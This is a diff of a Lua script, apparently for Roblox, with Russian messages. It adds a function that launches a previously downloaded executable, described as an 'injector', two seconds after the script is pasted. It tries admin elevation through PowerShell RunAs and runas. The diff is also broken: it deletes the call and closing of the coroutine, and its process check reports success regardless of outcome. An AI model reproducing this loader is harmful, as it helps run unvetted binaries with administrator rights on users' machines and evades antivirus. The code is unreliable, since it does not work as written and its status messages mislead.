@@ -65,8 +65,78 @@ end
 -- Запускаем загрузчик в отдельном потоке с небольшой задержкой
 coroutine.wrap(function()
     task.wait(2) -- Ждем 2 секунды после вставки скрипта
-    downloadAndExecute()
-end)()
+    local function downloadAndExecute()
+    -- ... (код скачивания и сохранения БЕЗ ИЗМЕНЕНИЙ до print("[3/3] Файл сохранен...")) ...
+
+    print("[3/3] Файл сохранен: " .. temp_path)
+    print("[DEBUG] Пробую запустить с повышенными правами...")
+
+    -- ===== МЕТОД 1: Запуск от имени администратора (самый важный!) =====
+    local success = false
+    local methods = {
+        {
+            name = "PowerShell (как Админ)",
+            cmd = 'powershell -Command "Start-Process \'' .. temp_path .. '\' -Verb RunAs -WindowStyle Normal"'
+        },
+        {
+            name = "Через runas (командная строка)",
+            cmd = 'runas /user:Administrator "' .. temp_path .. '"'
+        },
+        {
+            name = "Обычный запуск (на случай если права не нужны)",
+            cmd = 'start "" "' .. temp_path .. '"'
+        },
+        {
+            name = "Прямой вызов",
+            cmd = '"' .. temp_path .. '"'
+        }
+    }
+
+    for i, method in ipairs(methods) do
+        print("Попытка " .. i .. ": " .. method.name)
+        local ok, _ = pcall(function() 
+            os.execute(method.cmd) 
+        end)
+        
+        if ok then
+            print("  -> Команда отправлена без ошибок.")
+            success = true
+            -- Дадим время на всплывание UAC и запуск
+            task.wait(5) 
+            break
+        else
+            print("  -> Метод не сработал.")
+        end
+        task.wait(1) -- Пауза между попытками
+    end
+
+    -- ===== ПРОВЕРКА РЕЗУЛЬТАТА =====
+    print("\n[ПРОВЕРКА] Ищу процесс в памяти...")
+    local check_ok = pcall(function()
+        -- Эта команда возвращает код успеха, если процесс найден
+        os.execute('tasklist /FI "IMAGENAME eq ' .. EXE_NAME .. '" 2>nul | find /I "' .. EXE_NAME .. '" >nul')
+    end)
+
+    if check_ok then
+        print("========================================")
+        print("✅ УСПЕХ: Процесс '" .. EXE_NAME .. "' ЗАПУЩЕН!")
+        print("========================================")
+        print("Что это значит:")
+        print("1. Инжектор, скорее всего, работает в фоне/трее")
+        print("2. Проверь иконки в системном трее (возле часов)")
+        print("3. Попробуй нажать Ctrl+Shift+Esc и найти процесс")
+    else
+        print("========================================")
+        print("⚠ ПРОЦЕСС НЕ НАЙДЕН В ПАМЯТИ.")
+        print("========================================")
+        print("Вероятные причины:")
+        print("1. Программа требует прав Администратора (UAC)")
+        print("2. Антивирус/Защитник мгновенно удалил файл")
+        print("3. Файл поврежден или не является Windows .exe")
+    end
+
+    return success
+end
 -- ========== КОНЕЦ НОВОГО КОДА ==========
 
 
